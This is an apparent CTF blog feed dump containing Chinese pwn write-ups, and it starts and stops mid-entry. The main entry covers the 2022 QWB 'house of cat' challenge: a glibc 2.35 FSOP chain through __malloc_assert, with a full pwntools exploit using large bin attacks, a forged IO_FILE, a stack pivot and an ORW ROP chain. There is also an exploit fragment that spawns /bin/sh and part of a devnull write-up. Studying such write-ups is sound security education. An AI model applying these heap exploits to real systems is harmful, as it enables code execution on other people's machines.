class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>+<span class="number">0xe0</span></span><br><span class="line">file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="built_in">bytes</span>(file)+p64(sys_addr)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">10</span>+p32(<span class="number">0</span>))</span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>比赛结束，环境直接关闭了，也没法打远程，就自己打了下本地。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102111363.png" alt="image-20230110211123791"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> global_max_fast </tag>
            
            <tag> FSOP </tag>
            
            <tag> 伪造IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of cat -2022强网杯pwn复现</title>
      <link href="/posts/7de5a5b7.html"/>
      <url>/posts/7de5a5b7.html</url>
      
        <content type="html"><![CDATA[<p>前几天进行了 <code>house of apple</code> 的学习，而 <code>house of appl2</code> 和 <code>house of cat</code> 利用的大致思想是一样的（都是通过 <code>wide_data-&gt;wide_vtable</code> 中的函数指针进行的跳转），因此来复现一下去年强网杯的这道 <code>house of cat</code></p><p>本题我感觉也比较有代表性，因为在 <code>house of apple</code> 的那篇文章中的例题最后触发攻击是在 <code>exit</code> 函数，但是如果题目中无法从 <code>main</code> 函数返回也没有 <code>exit</code> 函数，那就需要通过 <code>malloc_assert</code> 来触发最后的攻击，而本题就是通过这样的方式触发的攻击。</p><h3 id="如何通过-malloc-assert-触发攻击">如何通过 <code>malloc_assert</code> 触发攻击</h3><p><code>__malloc_assert</code> 函数会在内存分配处理之前检查请求是否合法，如果检测到不合法的请求就会触发断言并终止程序，触发这个 <code>__malloc_assert</code> 函数有很多处，<strong>通常我们选择将 <code>top chunk</code> 的 <code>size</code>  改成非法（在 <code>sysmalloc</code> 函数中有针对这里的检查），这样再次申请堆块的时候就会触发 <code>__malloc_assert</code></strong></p><p><code>__malloc_assert</code> 在 <code>2.35</code> 的 <code>glibc</code> 中源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有这样一条执行链 <code>__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked_vfxprintf-&gt;__vfprintf_internal-&gt;_IO_file_xsputn</code></p><p>最后触发的 <code>_IO_file_xsputn</code> 是通过 <code>vtable</code> 中的函数指针来触发的，我们想要去劫持的话，首先将 <code>_IO_2_1_stderr</code> 结构体中的 <code>vtable</code> 改成 <code>_IO_wfile_jumps+0x10</code> 的地址（加 <code>0x10</code> 的原因是 <code>_IO_file_xsputn</code> 的地址在 <code>_IO_file_jumps</code> 中比 <code>IO_file_seekoff</code> 的地址低 <code>0x10</code> 个字节），这样原本跳转执行 <code>_IO_file_xsputn</code> 时，实际上执行的是 <code>_IO_wfile_seekoff</code> 如下图</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302040938184.png" alt="image-20230204093820778"></p><p><code>_IO_wfile_seekoff</code> 函数源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们执行 <code>_IO_wfile_seekoff</code> 函数的目的就是为了触发 <code>_IO_switch_to_wget_mode</code> 函数</p><p><code>_IO_switch_to_wget_mode</code> 函数源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 <code>_IO_switch_to_wget_mode</code> 函数的目的就是为了触发 <code>_IO_WOVERFLOW</code> ,因为这个 <code>_IO_WOVERFLOW</code> 函数是通过 <code>_wide_data-&gt;_wide_vtable</code> 中所存放的函数指针进行跳转的， <code>_wide_vtable</code> 是我们可控的，从而在这里可以劫持程序的执行流。</p><p>想触发最后的 <code>_IO_WOVERFLOW</code> ，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 这个条件。</p><p>之所以先提上面的部分是因为本题接下来用的手法只有上面部分是 <code>house of apple2</code>  中没有提到的，其余部分都和 <code>house of apple2</code> 中的利用思路相似，就不再详细说明。</p><h3 id="house-of-cat">house of cat</h3><p>附件：</p><p>链接: <a href="https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4">https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4</a> 提取码: ccp4</p><h4 id="保护策略">保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041006987.png" alt="image-20230204100619768" style="zoom: 67%;" /><p>保护拉满，沙箱是白名单只能打 <code>orw</code> ，需要注意一下 <code>read</code> 的第一个参数只能设置为 <code>0</code> ，所以最后打 <code>orw</code> 之前需要先 <code>close(0)</code></p><h4 id="程序逻辑">程序逻辑</h4><p>程序是一个菜单的堆题，不过在使用程序的主要功能之前，需要输入一些数据来绕过这个检查，可能自己的逆向能力还得提高吧，反正这里的检查我是搞了好久，结论就是最开始输入 <code>LOGIN | r00t QWB QWXFadmin</code> 去进行登录，接下来每一次调用具体功能之前都要发送一句 <code>CAT | r00t QWB QWXF$\xff</code> ,接下来才能去执行正常的功能。</p><p>功能一共有四个 <code>add</code> <code>edit</code> <code>show</code> <code>delete</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041015973.png" alt="image-20230204101548907" style="zoom:50%;" /><p><code>edit</code> 函数只能使用两次，并且只能写入 <code>0x30</code> 字节的数据</p><p><code>delete</code> 函数存在 <code>UAF</code> 漏洞</p><p><code>add</code> 函数申请的堆块大小的范围是 <code>0x418~0x46f</code> ，申请完堆块后可以向里面写入 <code>size</code> 字节的数据</p><p><code>show</code> 函数只能泄露 <code>0x30</code> 字节的数据</p><h4 id="利用思路">利用思路</h4><ol><li>泄露 <code>libc</code> 地址和堆地址</li><li>利用 <code>edit</code> 函数完成第一次 <code>large bin attack</code> 向 <code>libc</code> 中的全局变量 <code>stderr</code> 写入一个堆地址，从而控制 <code>_IO_2_1_stderr</code> 结构体的各个字段</li><li>第二次 <code>large bin attack</code> 去篡改 <code>top chunk</code> 的 <code>size</code> 将其改为非法（要往小了改，因为只有 <code>top chunk</code> 无法满足要申请的 <code>size </code> 时，才会触发 <code>sysmalloc</code>） <strong>注意 <code>large bin attack</code> 想将 <code>top chunk</code> 的 <code>size</code> 改小的话，需要地址错位</strong></li><li>申请一个堆块，此时执行 <code>__malloc_assert</code> 触发攻击</li></ol><p>思路不难，难点在于整体的一个堆风水和结构体布局需要慢慢调试，因为文章开头已经说明了如何通过 <code>__malloc_assert</code> 触发攻击，剩下的就是先劫持 <code>_IO_2_1_stderr</code> 结构体，将其的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps+0x10</code>  地址，然后 <code>_wide_data-&gt;vtable</code> 改为可控堆地址，使其执行 <code>_IO_WOVERFLOW</code> 的时候，可以进行劫持执行流（这里只说明了<strong>部分篡改</strong>的字段）</p><p>然后依然是 <a href="https://zikh26.github.io/posts/19609dd.html">house of apple2</a> 这篇文章的例题中提到的用 <code>magic_gadget</code> 进行一个栈迁移（如果需要看具体的细节请参考 <code>house of apple</code> 这篇文章），然后彻底控制程序的执行流，去打 <code>rop</code> 链，执行 <code>close</code> <code>open</code> <code>read</code> <code>write</code> 函数</p><p>最后我出示一下伪造的两个结构体</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041045993.png" alt="image-20230204104522759" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048906.png" alt="image-20230204104823695" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048822.png" alt="image-20230204104835594" style="zoom:50%;" /><h4 id="EXP">EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0xe</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x21a0e0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x000000000003a889</span></span><br><span class="line">stderr_ptr=<span class="number">0x21a860</span>+libc_base</span><br><span class="line">lock=libc_base+<span class="number">0x21ba60</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr=libc_base+libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#close</span></span><br><span class="line">rop=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(close_addr)</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x1168</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line">wide_data+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x1170</span>)<span class="comment">#wide_vtable</span></span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(add_rsp_ret)</span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0x1178</span>+<span class="number">0x30</span>+heap_base)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(leave_ret)</span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x1180</span>+<span class="number">0x30</span>)<span class="comment">#  rbp   io_save_base</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(lock)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x10a0</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(libc_base+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)<span class="comment">#vtable</span></span><br><span class="line">io_file+=wide_data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>,io_file)<span class="comment">#0xwfile 2160c0</span></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0x460</span>,<span class="string">&#x27;prevent merge chunk&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(IO_list_all)+p64(stderr_ptr-<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;large bin attack chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#second large bin attack</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x21a0e0</span>+libc_base)+p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x3265</span>-<span class="number">2</span>+heap_base-<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1F04</span>,<span class="number">0x1F10</span>,<span class="number">0x1EF8</span>,<span class="number">0x1EEC</span>,<span class="number">0x177F</span>) </span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x46f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x46f</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041055201.png" alt="image-20230204105543745"></p><h3 id="参考文章">参考文章</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/127290280">(44条消息) house of cat 学习_Nqoinaen的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪造IO_FILE </tag>
            
            <tag> orw </tag>
            
            <tag> house of cat </tag>
            
            <tag> large bin attack </tag>
            
            <tag> malloc_assert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022强网杯 强网先锋-devnull wp</title>
      <link href="/posts/e9a7fcac.html"/>
      <url>/posts/e9a7fcac.html</url>
      
        <content type="html"><![CDATA[<p>第一次打强网杯，加上强网先锋中的devnull这道题，一共放了18道pwn题。强pwn杯了属于是。不过自己还是太菜了18道pwn，就会做一道。主要也确实是没有学到后面的部分，目前的水平也只够做devnull这道题的，相信明年的时候会做出来更多的pwn题。然后这里我详细写一下devnull这道题的write up。</p><p>这道题应该是必须要一个2.34的libc，而且用glibc-all-in-one里的libc patch上去还有点问题。所以我选择了直接把文件拉到docker里做。</p><p>如果你想简单学习一下docker，可以看一下我写的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">文章</a></p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/image-20221007213821080.png" alt=""></p><h2 id="漏洞所在">漏洞所在:</h2><p>首先要先明确一点，fgets(s,n,stdin)函数只能读入n-1个字符，最后会在字符串末尾添加一个\x00。</p><p>我们看一下下面三张图片：</p><p><img src="../img/image-20221007213829044.png" alt=""></p><p><img src="../img/image-20221007213836991.png" alt=""></p><p><img src="../img/image-20221007213844664.png" alt="image-20221007213844664"></p><p>发现fgets将数据写入s的地址和fd(这个是接下来read函数的fd，等下会分析)相差0x20，而我们可以输入0x21个数据(其实只能写入0x20个字节数据，最后一个是\x00)，而最后的00就溢出到了fd上。</p><p>我们再看下read函数</p><p><img src="../img/image-20221007213902123.png" alt="image-20221007213902123"></p><p><img src="../img/image-20221007213922384.png" alt=""></p><p>发现正常的话，这里的fd应该是3。(然后再看下read函数的后两个参数)</p><p><img src="../img/image-20221007213930111.png" alt=""></p><p><img src="../img/image-20221007213939023.png" alt="image-20221007213939023"></p><p>然后得出结论，如果fd是0的话，输入0x2c个数据是可以溢出到返回地址的。但正常情况下fd是3，也就是说，正常情况下我们其实没法用这个read从stdin上输入数据。所以必须让它为0，方法就是fgets输满，将fd溢出成0（上面提过了）</p><h2 id="利用思路：">利用思路：</h2><h3 id="控制第二个read的buf">控制第二个read的buf</h3><p>由于我们这道题没办法泄露libc地址，但是正好有个mprotect函数，所以就考虑去执行mprotect获取一片可读可写可执行的区域后，打shellcode来获取shell。尽管题目close(1) 但是我们只要可以获取shell，将输出重定向一下即可，所以问题不大。</p><p>然后现在就考虑怎么去执行mprotect函数打shellcode。</p><p>上面提到了，我们可以溢出到返回地址，但是也仅仅只能溢出到返回地址，所以考虑来打一个栈迁移。</p><p>但是最重要的一个问题就是我们怎么将数据输入到迁移的地方。就是迁移之后，执行啥？</p><p>我们再看看还有没有能利用的地方了，发现还有最后一个read可以用。</p><p><img src="../img/image-20221007213948819.png" alt=""></p><p>而这个read输入的数据是写到了buf的位置。</p><p><img src="../img/image-20221007213959805.png" alt="image-20221007213959805"></p><p>而buf又正好可以被第一次read函数的数据给覆盖掉，所以说这个read写入数据的地址其实是可控的，因此我们可以将执行流迁移到一个固定且已知的地址，然后再用第二次read向迁移的地方布置一个rop链。</p><h3 id="布置rop链">布置rop链</h3><p>我感觉这道题布置rop链这里也挺关键的，不知道其他师傅和我的思路一不一样。</p><p>我们调试一下，看看执行迁移时寄存器的值有没有什么能利用的。</p><p><img src="../img/image-20221007214008908.png" 